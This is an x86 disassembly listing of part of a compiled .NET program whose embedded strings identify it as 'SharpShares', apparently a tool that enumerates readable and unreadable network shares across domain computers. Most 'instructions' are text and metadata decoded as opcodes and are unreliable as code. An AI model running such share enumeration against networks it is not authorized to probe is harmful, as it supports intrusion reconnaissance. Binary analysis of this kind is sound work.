  403bc0:	4f                   	dec    %edi
  403bc1:	00 52 00             	add    %dl,0x0(%edx)
  403bc4:	3d 00 35 00 33       	cmp    $0x33003500,%eax
  403bc9:	00 00                	add    %al,(%eax)
  403bcb:	0f 45 00             	cmovne (%eax),%eax
  403bce:	52                   	push   %edx
  403bcf:	00 52 00             	add    %dl,0x0(%edx)
  403bd2:	4f                   	dec    %edi
  403bd3:	00 52 00             	add    %dl,0x0(%edx)
  403bd6:	3d 00 35 00 00       	cmp    $0x3500,%eax
  403bdb:	13 5c 00 5c          	adc    0x5c(%eax,%eax,1),%ebx
  403bdf:	00 7b 00             	add    %bh,0x0(%ebx)
  403be2:	30 00                	xor    %al,(%eax)
  403be4:	7d 00                	jge    0x403be6
  403be6:	5c                   	pop    %esp
  403be7:	00 7b 00             	add    %bh,0x0(%ebx)
  403bea:	31 00                	xor    %eax,(%eax)
  403bec:	7d 00                	jge    0x403bee
  403bee:	00 21                	add    %ah,(%ecx)
  403bf0:	53                   	push   %ebx
  403bf1:	00 68 00             	add    %ch,0x0(%eax)
  403bf4:	61                   	popa
  403bf5:	00 72 00             	add    %dh,0x0(%edx)
  403bf8:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  403bfc:	20 00                	and    %al,(%eax)
  403bfe:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  403c02:	72 00                	jb     0x403c04
  403c04:	20 00                	and    %al,(%eax)
  403c06:	7b 00                	jnp    0x403c08
  403c08:	30 00                	xor    %al,(%eax)
  403c0a:	7d 00                	jge    0x403c0c
  403c0c:	3a 00                	cmp    (%eax),%al
  403c0e:	0a 00                	or     (%eax),%al
  403c10:	00 37                	add    %dh,(%edi)
  403c12:	09 00                	or     %eax,(%eax)
  403c14:	5b                   	pop    %ebx
  403c15:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  403c1b:	00 20                	add    %ah,(%eax)
  403c1d:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  403c21:	00 73 00             	add    %dh,0x0(%ebx)
  403c24:	74 00                	je     0x403c26
  403c26:	61                   	popa
  403c27:	00 62 00             	add    %ah,0x0(%edx)
  403c2a:	6c                   	insb   (%dx),%es:(%edi)
  403c2b:	00 65 00             	add    %ah,0x0(%ebp)
  403c2e:	20 00                	and    %al,(%eax)
  403c30:	53                   	push   %ebx
  403c31:	00 68 00             	add    %ch,0x0(%eax)
  403c34:	61                   	popa
  403c35:	00 72 00             	add    %dh,0x0(%edx)
  403c38:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  403c3c:	20 00                	and    %al,(%eax)
  403c3e:	2d 00 2d 00 2d       	sub    $0x2d002d00,%eax
  403c43:	00 5d 00             	add    %bl,0x0(%ebp)
  403c46:	0a 00                	or     (%eax),%al
  403c48:	01 0d 09 00 09 00    	add    %ecx,0x90009
  403c4e:	7b 00                	jnp    0x403c50
  403c50:	30 00                	xor    %al,(%eax)
  403c52:	7d 00                	jge    0x403c54
  403c54:	0a 00                	or     (%eax),%al
  403c56:	00 3b                	add    %bh,(%ebx)
  403c58:	09 00                	or     %eax,(%eax)
  403c5a:	5b                   	pop    %ebx
  403c5b:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  403c61:	00 20                	add    %ah,(%eax)
  403c63:	00 55 00             	add    %dl,0x0(%ebp)
  403c66:	6e                   	outsb  %ds:(%esi),(%dx)
  403c67:	00 72 00             	add    %dh,0x0(%edx)
  403c6a:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  403c6e:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  403c72:	62 00                	bound  %eax,(%eax)
  403c74:	6c                   	insb   (%dx),%es:(%edi)
  403c75:	00 65 00             	add    %ah,0x0(%ebp)
  403c78:	20 00                	and    %al,(%eax)
  403c7a:	53                   	push   %ebx
  403c7b:	00 68 00             	add    %ch,0x0(%eax)
  403c7e:	61                   	popa
  403c7f:	00 72 00             	add    %dh,0x0(%edx)
  403c82:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  403c86:	20 00                	and    %al,(%eax)
  403c88:	2d 00 2d 00 2d       	sub    $0x2d002d00,%eax
  403c8d:	00 5d 00             	add    %bl,0x0(%ebp)
  403c90:	0a 00                	or     (%eax),%al
  403c92:	01 0b                	add    %ecx,(%ebx)
  403c94:	09 00                	or     %eax,(%eax)
  403c96:	09 00                	or     %eax,(%eax)
  403c98:	7b 00                	jnp    0x403c9a
  403c9a:	30 00                	xor    %al,(%eax)
  403c9c:	7d 00                	jge    0x403c9e
  403c9e:	00 1b                	add    %bl,(%ebx)
  403ca0:	43                   	inc    %ebx
  403ca1:	00 6f 00             	add    %ch,0x0(%edi)
  403ca4:	6d                   	insl   (%dx),%es:(%edi)
  403ca5:	00 70 00             	add    %dh,0x0(%eax)
  403ca8:	74 00                	je     0x403caa
  403caa:	75 00                	jne    0x403cac
  403cac:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  403cb0:	3a 00                	cmp    (%eax),%al
  403cb2:	20 00                	and    %al,(%eax)
  403cb4:	7b 00                	jnp    0x403cb6
  403cb6:	30 00                	xor    %al,(%eax)
  403cb8:	7d 00                	jge    0x403cba
  403cba:	00 0b                	add    %cl,(%ebx)
  403cbc:	5c                   	pop    %esp
  403cbd:	00 5c 00 7b          	add    %bl,0x7b(%eax,%eax,1)
  403cc1:	00 30                	add    %dh,(%eax)
  403cc3:	00 7d 00             	add    %bh,0x0(%ebp)
  403cc6:	00 0f                	add    %cl,(%edi)
  403cc8:	52                   	push   %edx
  403cc9:	00 65 00             	add    %ah,0x0(%ebp)
  403ccc:	74 00                	je     0x403cce
  403cce:	20 00                	and    %al,(%eax)
  403cd0:	69 00 73 00 3a 00    	imul   $0x3a0073,(%eax),%eax
  403cd6:	00 41 5b             	add    %al,0x5b(%ecx)
  403cd9:	00 2a                	add    %ch,(%edx)
  403cdb:	00 5d 00             	add    %bl,0x0(%ebp)
  403cde:	20 00                	and    %al,(%eax)
  403ce0:	50                   	push   %eax
  403ce1:	00 61 00             	add    %ah,0x0(%ecx)
  403ce4:	72 00                	jb     0x403ce6
  403ce6:	73 00                	jae    0x403ce8
  403ce8:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  403ced:	00 7b 00             	add    %bh,0x0(%ebx)
  403cf0:	30 00                	xor    %al,(%eax)
  403cf2:	7d 00                	jge    0x403cf4
  403cf4:	20 00                	and    %al,(%eax)
  403cf6:	63 00                	arpl   %eax,(%eax)
  403cf8:	6f                   	outsl  %ds:(%esi),(%dx)
  403cf9:	00 6d 00             	add    %ch,0x0(%ebp)
  403cfc:	70 00                	jo     0x403cfe
  403cfe:	75 00                	jne    0x403d00
  403d00:	74 00                	je     0x403d02
  403d02:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  403d06:	20 00                	and    %al,(%eax)
  403d08:	6f                   	outsl  %ds:(%esi),(%dx)
  403d09:	00 62 00             	add    %ah,0x0(%edx)
  403d0c:	6a 00                	push   $0x0
  403d0e:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  403d12:	74 00                	je     0x403d14
  403d14:	73 00                	jae    0x403d16
  403d16:	2e 00 00             	add    %al,%cs:(%eax)
  403d19:	07                   	pop    %es
  403d1a:	69 00 70 00 73 00    	imul   $0x730070,(%eax),%eax
  403d20:	00 0d 73 00 68 00    	add    %cl,0x680073
  403d26:	61                   	popa
  403d27:	00 72 00             	add    %dh,0x0(%edx)
  403d2a:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  403d2e:	00 1b                	add    %bl,(%ebx)
  403d30:	2d 00 2d 00 70       	sub    $0x70002d00,%eax
  403d35:	00 75 00             	add    %dh,0x0(%ebp)
  403d38:	62 00                	bound  %eax,(%eax)
  403d3a:	6c                   	insb   (%dx),%es:(%edi)
  403d3b:	00 69 00             	add    %ch,0x0(%ecx)
  403d3e:	63 00                	arpl   %eax,(%eax)
  403d40:	2d 00 6f 00 6e       	sub    $0x6e006f00,%eax
  403d45:	00 6c 00 79          	add    %ch,0x79(%eax,%eax,1)
  403d49:	00 01                	add    %al,(%ecx)
  403d4b:	4f                   	dec    %edi
  403d4c:	41                   	inc    %ecx
  403d4d:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  403d51:	00 65 00             	add    %ah,0x0(%ebp)
  403d54:	6d                   	insl   (%dx),%es:(%edi)
  403d55:	00 70 00             	add    %dh,0x0(%eax)
  403d58:	74 00                	je     0x403d5a
  403d5a:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  403d60:	20 00                	and    %al,(%eax)
  403d62:	74 00                	je     0x403d64
  403d64:	6f                   	outsl  %ds:(%esi),(%dx)
  403d65:	00 20                	add    %ah,(%eax)
  403d67:	00 65 00             	add    %ah,0x0(%ebp)
  403d6a:	6e                   	outsb  %ds:(%esi),(%dx)
  403d6b:	00 75 00             	add    %dh,0x0(%ebp)
  403d6e:	6d                   	insl   (%dx),%es:(%edi)
  403d6f:	00 65 00             	add    %ah,0x0(%ebp)
  403d72:	72 00                	jb     0x403d74
  403d74:	61                   	popa
  403d75:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  403d79:	00 20                	add    %ah,(%eax)
  403d7b:	00 73 00             	add    %dh,0x0(%ebx)
  403d7e:	68 00 61 00 72       	push   $0x72006100
  403d83:	00 65 00             	add    %ah,0x0(%ebp)
  403d86:	73 00                	jae    0x403d88
  403d88:	20 00                	and    %al,(%eax)
  403d8a:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  403d8e:	72 00                	jb     0x403d90
  403d90:	3a 00                	cmp    (%eax),%al
  403d92:	20 00                	and    %al,(%eax)
  403d94:	7b 00                	jnp    0x403d96
  403d96:	30 00                	xor    %al,(%eax)
  403d98:	7d 00                	jge    0x403d9a
  403d9a:	00 11                	add    %dl,(%ecx)
  403d9c:	76 00                	jbe    0x403d9e
  403d9e:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  403da2:	73 00                	jae    0x403da4
  403da4:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  403daa:	73 00                	jae    0x403dac
  403dac:	00 77 45             	add    %dh,0x45(%edi)
  403daf:	00 72 00             	add    %dh,0x0(%edx)
  403db2:	72 00                	jb     0x403db4
  403db4:	6f                   	outsl  %ds:(%esi),(%dx)
  403db5:	00 72 00             	add    %dh,0x0(%edx)
  403db8:	3a 00                	cmp    (%eax),%al
  403dba:	20 00                	and    %al,(%eax)
  403dbc:	4e                   	dec    %esi
  403dbd:	00 6f 00             	add    %ch,0x0(%edi)
  403dc0:	74 00                	je     0x403dc2
  403dc2:	20 00                	and    %al,(%eax)
  403dc4:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  403dc8:	6f                   	outsl  %ds:(%esi),(%dx)
  403dc9:	00 75 00             	add    %dh,0x0(%ebp)
  403dcc:	67 00 68 00          	add    %ch,0x0(%bx,%si)
  403dd0:	20 00                	and    %al,(%eax)
  403dd2:	61                   	popa
  403dd3:	00 72 00             	add    %dh,0x0(%edx)
  403dd6:	67 00 75 00          	add    %dh,0x0(%di)
  403dda:	6d                   	insl   (%dx),%es:(%edi)
  403ddb:	00 65 00             	add    %ah,0x0(%ebp)
  403dde:	6e                   	outsb  %ds:(%esi),(%dx)
  403ddf:	00 74 00 73          	add    %dh,0x73(%eax,%eax,1)
  403de3:	00 2e                	add    %ch,(%esi)
  403de5:	00 20                	add    %ah,(%eax)
  403de7:	00 50 00             	add    %dl,0x0(%eax)
  403dea:	6c                   	insb   (%dx),%es:(%edi)
  403deb:	00 65 00             	add    %ah,0x0(%ebp)
  403dee:	61                   	popa
  403def:	00 73 00             	add    %dh,0x0(%ebx)
  403df2:	65 00 20             	add    %ah,%gs:(%eax)
  403df5:	00 70 00             	add    %dh,0x0(%eax)
  403df8:	61                   	popa
  403df9:	00 73 00             	add    %dh,0x0(%ebx)
  403dfc:	73 00                	jae    0x403dfe
  403dfe:	20 00                	and    %al,(%eax)
  403e00:	22 00                	and    (%eax),%al
  403e02:	69 00 70 00 73 00    	imul   $0x730070,(%eax),%eax
  403e08:	22 00                	and    (%eax),%al
  403e0a:	20 00                	and    %al,(%eax)
  403e0c:	6f                   	outsl  %ds:(%esi),(%dx)
  403e0d:	00 72 00             	add    %dh,0x0(%edx)
  403e10:	20 00                	and    %al,(%eax)
  403e12:	22 00                	and    (%eax),%al
  403e14:	73 00                	jae    0x403e16
  403e16:	68 00 61 00 72       	push   $0x72006100
  403e1b:	00 65 00             	add    %ah,0x0(%ebp)
  403e1e:	73 00                	jae    0x403e20
  403e20:	22 00                	and    (%eax),%al
  403e22:	2e 00 00             	add    %al,%cs:(%eax)
  403e25:	00 00                	add    %al,(%eax)
  403e27:	00 3f                	add    %bh,(%edi)
  403e29:	4d                   	dec    %ebp
  403e2a:	6c                   	insb   (%dx),%es:(%edi)
  403e2b:	7c 64                	jl     0x403e91
  403e2d:	e9 23 4d a6 8b       	jmp    0x8be68b55
  403e32:	b2 82                	mov    $0x82,%dl
  403e34:	31 51 45             	xor    %edx,0x45(%ecx)
  403e37:	21 00                	and    %eax,(%eax)
  403e39:	04 20                	add    $0x20,%al
  403e3b:	01 01                	add    %eax,(%ecx)
  403e3d:	08 03                	or     %al,(%ebx)
  403e3f:	20 00                	and    %al,(%eax)
  403e41:	01 05 20 01 01 11    	add    %eax,0x11010120
  403e47:	11 04 20             	adc    %eax,(%eax,%eiz,1)
  403e4a:	01 01                	add    %eax,(%ecx)
  403e4c:	0e                   	push   %cs
  403e4d:	04 20                	add    $0x20,%al
  403e4f:	01 01                	add    %eax,(%ecx)
  403e51:	02 12                	add    (%edx),%dl
  403e53:	07                   	pop    %es
  403e54:	0a 15 12 51 01 11    	or     0x11015112,%dl
  403e5a:	14 08                	adc    $0x8,%al
  403e5c:	08 08                	or     %cl,(%eax)
  403e5e:	08 18                	or     %bl,(%eax)
  403e60:	08 18                	or     %bl,(%eax)
  403e62:	08 11                	or     %dl,(%ecx)
  403e64:	14 06                	adc    $0x6,%al
  403e66:	15 12 51 01 11       	adc    $0x11015112,%eax
  403e6b:	14 08                	adc    $0x8,%al
  403e6d:	00 01                	add    %al,(%ecx)
  403e6f:	12 80 85 11 80 89    	adc    -0x767fee7b(%eax),%al
  403e75:	06                   	push   %es
  403e76:	00 01                	add    %al,(%ecx)
  403e78:	08 12                	or     %dl,(%edx)
  403e7a:	80 85 02 06 18 07 00 	addb   $0x0,0x7180602(%ebp)
  403e81:	02 1c 18             	add    (%eax,%ebx,1),%bl
  403e84:	12 80 85 05 20 01    	adc    0x1200585(%eax),%al
  403e8a:	01 13                	add    %edx,(%ebx)
  403e8c:	00 05 00 02 18 18    	add    %al,0x18180200
  403e92:	08 05 20 00 1d 13    	or     %al,0x131d0020
  403e98:	00 03                	add    %al,(%ebx)
  403e9a:	20 00                	and    %al,(%eax)
  403e9c:	0e                   	push   %cs
  403e9d:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  403ea2:	0e                   	push   %cs
  403ea3:	02 06                	add    (%esi),%al
  403ea5:	0e                   	push   %cs
  403ea6:	0e                   	push   %cs
  403ea7:	07                   	pop    %es
  403ea8:	04 15                	add    $0x15,%al
  403eaa:	12 51 01             	adc    0x1(%ecx),%dl
  403ead:	12 55 12             	adc    0x12(%ebp),%dl
  403eb0:	59                   	pop    %ecx
  403eb1:	12 55 12             	adc    0x12(%ebp),%dl
  403eb4:	5d                   	pop    %ebp
  403eb5:	06                   	push   %es
  403eb6:	15 12 51 01 12       	adc    $0x12015112,%eax
  403ebb:	55                   	push   %ebp
  403ebc:	05 00 00 12 80       	add    $0x80120000,%eax
  403ec1:	9d                   	popf
  403ec2:	05 20 00 12 80       	add    $0x80120020,%eax
  403ec7:	a1 04 20 00 12       	mov    0x12002004,%eax
  403ecc:	59                   	pop    %ecx
  403ecd:	03 20                	add    (%eax),%esp
  403ecf:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  403ed2:	20 00                	and    %al,(%eax)
  403ed4:	02 0e                	add    (%esi),%cl
  403ed6:	07                   	pop    %es
  403ed7:	05 15 11 61 01       	add    $0x1611115,%eax
  403edc:	0e                   	push   %cs
  403edd:	0e                   	push   %cs
  403ede:	1d 12 65 08 12       	sbb    $0x12086512,%eax
  403ee3:	65 05 15 12 51 01    	gs add $0x1511215,%eax
  403ee9:	0e                   	push   %cs
  403eea:	08 20                	or     %ah,(%eax)
  403eec:	00 15 11 61 01 13    	add    %dl,0x13016111
  403ef2:	00 05 15 11 61 01    	add    %al,0x1611115
  403ef8:	0e                   	push   %cs
  403ef9:	04 20                	add    $0x20,%al
  403efb:	00 13                	add    %dl,(%ebx)
  403efd:	00 06                	add    %al,(%esi)
  403eff:	00 01                	add    %al,(%ecx)
  403f01:	1d 12 65 0e 04       	sbb    $0x40e6512,%eax
  403f06:	20 01                	and    %al,(%ecx)
  403f08:	02 0e                	add    (%esi),%cl
  403f0a:	06                   	push   %es
  403f0b:	00 03                	add    %al,(%ebx)
  403f0d:	01 0e                	add    %ecx,(%esi)
  403f0f:	1c 1c                	sbb    $0x1c,%al
  403f11:	18 07                	sbb    %al,(%edi)
  403f13:	08 15 12 51 01 0e    	or     %dl,0xe015112
  403f19:	15 12 51 01 12       	adc    $0x12015112,%eax
  403f1e:	55                   	push   %ebp
  403f1f:	12 6d 12             	adc    0x12(%ebp),%ch
  403f22:	71 12                	jno    0x403f36
  403f24:	59                   	pop    %ecx
  403f25:	12 75 0e             	adc    0xe(%ebp),%dh
  403f28:	12 5d 03             	adc    0x3(%ebp),%bl
  403f2b:	20 00                	and    %al,(%eax)
  403f2d:	08 05 00 00 12 80    	or     %al,0x80120000
  403f33:	b1 06                	mov    $0x6,%cl
  403f35:	20 01                	and    %al,(%ecx)
  403f37:	1d 0e 1d 03 05       	sbb    $0x5031d0e,%eax
  403f3c:	20 01                	and    %al,(%ecx)
  403f3e:	13 00                	adc    (%eax),%eax
  403f40:	08 05 00 02 0e 0e    	or     %al,0xe0e0200
  403f46:	1c 05                	sbb    $0x5,%al
  403f48:	20 01                	and    %al,(%ecx)
  403f4a:	01 12                	add    %edx,(%edx)
  403f4c:	6d                   	insl   (%dx),%es:(%edi)
  403f4d:	05 20 00 12 80       	add    $0x80120020,%eax
  403f52:	b9 04 20 01 08       	mov    $0x8012004,%ecx
  403f57:	0e                   	push   %cs
  403f58:	05 20 00 12 80       	add    $0x80120020,%eax
  403f5d:	bd 05 20 00 12       	mov    $0x12002005,%ebp
  403f62:	80 c1 06             	add    $0x6,%cl
  403f65:	20 01                	and    %al,(%ecx)
  403f67:	12 80 c5 0e 04 20    	adc    0x20040ec5(%eax),%al
  403f6d:	01 1c 08             	add    %ebx,(%eax,%ecx,1)
  403f70:	04 00                	add    $0x0,%al
  403f72:	01 01                	add    %eax,(%ecx)
  403f74:	0e                   	push   %cs
  403f75:	21 07                	and    %eax,(%edi)
  403f77:	0d 1d 0e 1d 11       	or     $0x111d0e1d,%eax
  403f7c:	14 15                	adc    $0x15,%al
  403f7e:	12 51 01             	adc    0x1(%ecx),%dl
  403f81:	0e                   	push   %cs
  403f82:	15 12 51 01 0e       	adc    $0xe015112,%eax
  403f87:	1d 11 14 08 11       	sbb    $0x11081411,%eax
  403f8c:	14 0e                	adc    $0xe,%al
  403f8e:	15 11 61 01 0e       	adc    $0xe016111,%eax
  403f93:	0e                   	push   %cs
  403f94:	0e                   	push   %cs
  403f95:	0e                   	push   %cs
  403f96:	0e                   	push   %cs
  403f97:	06                   	push   %es
  403f98:	00 03                	add    %al,(%ebx)
  403f9a:	0e                   	push   %cs
  403f9b:	0e                   	push   %cs
  403f9c:	1c 1c                	sbb    $0x1c,%al
  403f9e:	05 00 01 1d 0e       	add    $0xe1d0100,%eax
  403fa3:	0e                   	push   %cs
  403fa4:	0d 10 01 02 02       	or     $0x2020110,%eax
  403fa9:	15 12 80 d1 01       	adc    $0x1d18012,%eax
  403fae:	1e                   	push   %ds
  403faf:	00 1e                	add    %bl,(%esi)
  403fb1:	00 03                	add    %al,(%ebx)
  403fb3:	0a 01                	or     (%ecx),%al
  403fb5:	0e                   	push   %cs
  403fb6:	17                   	pop    %ss
  403fb7:	07                   	pop    %es
  403fb8:	05 12 20 15 12       	add    $0x12152012,%eax
  403fbd:	51                   	push   %ecx
  403fbe:	01 12                	add    %edx,(%edx)
  403fc0:	79 15                	jns    0x403fd7
  403fc2:	11 61 01             	adc    %esp,0x1(%ecx)
  403fc5:	0e                   	push   %cs
  403fc6:	12 79 15             	adc    0x15(%ecx),%bh
  403fc9:	11 61 01             	adc    %esp,0x1(%ecx)
  403fcc:	12 79 06             	adc    0x6(%ecx),%bh
  403fcf:	15 12 51 01 12       	adc    $0x12015112,%eax
  403fd4:	79 05                	jns    0x403fdb
  403fd6:	20 02                	and    %al,(%edx)
  403fd8:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  403fdb:	06                   	push   %es
  403fdc:	20 01                	and    %al,(%ecx)
  403fde:	01 12                	add    %edx,(%edx)
  403fe0:	80 d5 06             	adc    $0x6,%ch
  403fe3:	15 11 61 01 12       	adc    $0x12016111,%eax
  403fe8:	79 0b                	jns    0x403ff5
  403fea:	07                   	pop    %es
  403feb:	04 15                	add    $0x15,%al
  403fed:	11 61 01             	adc    %esp,0x1(%ecx)
  403ff0:	0e                   	push   %cs
  403ff1:	0e                   	push   %cs
  403ff2:	18 11                	sbb    %dl,(%ecx)
  403ff4:	0c 05                	or     $0x5,%al
  403ff6:	00 02                	add    %al,(%edx)
  403ff8:	01 0e                	add    %ecx,(%esi)
  403ffa:	1c 04                	sbb    $0x4,%al
  403ffc:	00 01                	add    %al,(%ecx)
  403ffe:	01 08                	add    %ecx,(%eax)
  404000:	04 00                	add    $0x0,%al
  404002:	01 02                	add    %eax,(%edx)
  404004:	0e                   	push   %cs
  404005:	08 07                	or     %al,(%edi)
  404007:	02 15 12 51 01 0e    	add    0xe015112,%dl
  40400d:	02 05 00 02 02 08    	add    0x8020200,%al
  404013:	08 05 00 02 02 0e    	or     %al,0xe020200
  404019:	0e                   	push   %cs
  40401a:	08 b7 7a 5c 56 19    	or     %dh,0x19565c7a(%edi)
  404020:	34 e0                	xor    $0xe0,%al
  404022:	89 08                	mov    %ecx,(%eax)
  404024:	b0 3f                	mov    $0x3f,%al
  404026:	5f                   	pop    %edi
  404027:	7f 11                	jg     0x40403a
  404029:	d5 0a                	aad    $0xa
  40402b:	3a 04 ff             	cmp    (%edi,%edi,8),%al
  40402e:	ff                   	(bad)
  40402f:	ff                   	(bad)
  404030:	ff 04 00             	incl   (%eax,%eax,1)
  404033:	00 00                	add    %al,(%eax)
  404035:	00 04 34             	add    %al,(%esp,%esi,1)
  404038:	08 00                	or     %al,(%eax)
  40403a:	00 04 44             	add    %al,(%esp,%eax,2)
  40403d:	08 00                	or     %al,(%eax)
  40403f:	00 04 46             	add    %al,(%esi,%eax,2)
  404042:	08 00                	or     %al,(%eax)
  404044:	00 04 4b             	add    %al,(%ebx,%ecx,2)
  404047:	08 00                	or     %al,(%eax)
  404049:	00 04 01             	add    %al,(%ecx,%eax,1)
  40404c:	00 00                	add    %al,(%eax)
  40404e:	00 04 02             	add    %al,(%edx,%eax,1)
  404051:	00 00                	add    %al,(%eax)
  404053:	00 04 03             	add    %al,(%ebx,%eax,1)
  404056:	00 00                	add    %al,(%eax)
  404058:	00 04 00             	add    %al,(%eax,%eax,1)
  40405b:	00 00                	add    %al,(%eax)
  40405d:	80 01 00             	addb   $0x0,(%ecx)
  404060:	03 06                	add    (%esi),%eax
  404062:	12 49 02             	adc    0x2(%ecx),%cl
  404065:	06                   	push   %es
  404066:	09 02                	or     %eax,(%edx)
  404068:	06                   	push   %es
  404069:	08 03                	or     %al,(%ebx)
  40406b:	06                   	push   %es
  40406c:	11 18                	adc    %ebx,(%eax)
  40406e:	03 06                	add    (%esi),%eax
  404070:	11 1c 02             	adc    %ebx,(%edx,%eax,1)
  404073:	06                   	push   %es
  404074:	02 03                	add    (%ebx),%al
  404076:	06                   	push   %es
  404077:	12 20                	adc    (%eax),%ah
  404079:	04 00                	add    $0x0,%al
  40407b:	00 12                	add    %dl,(%edx)
  40407d:	49                   	dec    %ecx
  40407e:	05 00 01 01 12       	add    $0x12010100,%eax
  404083:	49                   	dec    %ecx
  404084:	07                   	pop    %es
  404085:	00 03                	add    %al,(%ebx)
  404087:	08 0e                	or     %cl,(%esi)
  404089:	08 10                	or     %dl,(%eax)
  40408b:	18 04 00             	sbb    %al,(%eax,%eax,1)
  40408e:	01 08                	add    %ecx,(%eax)
  404090:	18 0f                	sbb    %cl,(%edi)
  404092:	00 07                	add    %al,(%edi)
  404094:	08 12                	or     %dl,(%edx)
  404096:	4d                   	dec    %ebp
  404097:	08 10                	or     %dl,(%eax)
  404099:	18 09                	sbb    %cl,(%ecx)
  40409b:	10 08                	adc    %cl,(%eax)
  40409d:	10 08                	adc    %cl,(%eax)
  40409f:	10 08                	adc    %cl,(%eax)
  4040a1:	06                   	push   %es
  4040a2:	00 01                	add    %al,(%ecx)
  4040a4:	1d 11 14 0e 08       	sbb    $0x80e1411,%eax
  4040a9:	00 00                	add    %al,(%eax)
  4040ab:	15 12 51 01 12       	adc    $0x12015112,%eax
  4040b0:	55                   	push   %ebp
  4040b1:	08 00                	or     %al,(%eax)
  4040b3:	01 01                	add    %eax,(%ecx)
  4040b5:	15 12 51 01 0e       	adc    $0xe015112,%eax
  4040ba:	07                   	pop    %es
  4040bb:	00 00                	add    %al,(%eax)
  4040bd:	15 12 51 01 0e       	adc    $0xe015112,%eax
  4040c2:	05 00 02 01 0e       	add    $0xe010200,%eax
  4040c7:	02 09                	add    (%ecx),%cl
  4040c9:	00 02                	add    %al,(%edx)
  4040cb:	01 15 12 51 01 0e    	add    %edx,0xe015112
  4040d1:	02 05 00 01 01 1d    	add    0x1d010100,%al
  4040d7:	0e                   	push   %cs
  4040d8:	06                   	push   %es
  4040d9:	20 03                	and    %al,(%ebx)
  4040db:	01 0e                	add    %ecx,(%esi)
  4040dd:	09 0e                	or     %ecx,(%esi)
  4040df:	04 08                	add    $0x8,%al
  4040e1:	00 12                	add    %dl,(%edx)
  4040e3:	49                   	dec    %ecx
  4040e4:	08 01                	or     %al,(%ecx)
  4040e6:	00 08                	add    %cl,(%eax)
  4040e8:	00 00                	add    %al,(%eax)
  4040ea:	00 00                	add    %al,(%eax)
  4040ec:	00 1e                	add    %bl,(%esi)
  4040ee:	01 00                	add    %eax,(%eax)
  4040f0:	01 00                	add    %eax,(%eax)
  4040f2:	54                   	push   %esp
  4040f3:	02 16                	add    (%esi),%dl
  4040f5:	57                   	push   %edi
  4040f6:	72 61                	jb     0x404159
  4040f8:	70 4e                	jo     0x404148
  4040fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4040fb:	6e                   	outsb  %ds:(%esi),(%dx)
  4040fc:	45                   	inc    %ebp
  4040fd:	78 63                	js     0x404162
  4040ff:	65 70 74             	gs jo  0x404176
  404102:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  404109:	77 73                	ja     0x40417e
  40410b:	01 08                	add    %ecx,(%eax)
  40410d:	01 00                	add    %eax,(%eax)
  40410f:	02 00                	add    (%eax),%al
  404111:	00 00                	add    %al,(%eax)
  404113:	00 00                	add    %al,(%eax)
  404115:	10 01                	adc    %al,(%ecx)
  404117:	00 0b                	add    %cl,(%ebx)
  404119:	53                   	push   %ebx
  40411a:	68 61 72 70 53       	push   $0x53707261
  40411f:	68 61 72 65 73       	push   $0x73657261
  404124:	00 00                	add    %al,(%eax)
  404126:	05 01 00 00 00       	add    $0x1,%eax
  40412b:	00 17                	add    %dl,(%edi)
  40412d:	01 00                	add    %eax,(%eax)
  40412f:	12 43 6f             	adc    0x6f(%ebx),%al
  404132:	70 79                	jo     0x4041ad
  404134:	72 69                	jb     0x40419f
  404136:	67 68 74 20 c2 a9    	addr16 push $0xa9c22074
  40413c:	20 20                	and    %ah,(%eax)
  40413e:	32 30                	xor    (%eax),%dh
  404140:	31 38                	xor    %edi,(%eax)
  404142:	00 00                	add    %al,(%eax)
  404144:	29 01                	sub    %eax,(%ecx)
  404146:	00 24 66             	add    %ah,(%esi,%eiz,2)
  404149:	65 39 66 64          	cmp    %esp,%gs:0x64(%esi)
  40414d:	64 65 35 2d 33 66 33 	fs gs xor $0x3366332d,%eax
  404154:	38 2d 34 66 31 34    	cmp    %ch,0x34316634
  40415a:	2d 38 63 36 34       	sub    $0x34366338,%eax
  40415f:	2d 63 33 33 32       	sub    $0x32333363,%eax
  404164:	38 63 32             	cmp    %ah,0x32(%ebx)
  404167:	31 35 63 66 32 00    	xor    %esi,0x326663
  40416d:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  404170:	00 07                	add    %al,(%edi)
  404172:	31 2e                	xor    %ebp,(%esi)
  404174:	30 2e                	xor    %ch,(%esi)
  404176:	30 2e                	xor    %ch,(%esi)
  404178:	30 00                	xor    %al,(%eax)
  40417a:	00 47 01             	add    %al,0x1(%edi)
  40417d:	00 1a                	add    %bl,(%edx)
  40417f:	2e 4e                	cs dec %esi
  404181:	45                   	inc    %ebp
  404182:	54                   	push   %esp
  404183:	46                   	inc    %esi
  404184:	72 61                	jb     0x4041e7
  404186:	6d                   	insl   (%dx),%es:(%edi)
  404187:	65 77 6f             	gs ja  0x4041f9
  40418a:	72 6b                	jb     0x4041f7
  40418c:	2c 56                	sub    $0x56,%al
  40418e:	65 72 73             	gs jb  0x404204
  404191:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  404198:	30 01                	xor    %al,(%ecx)
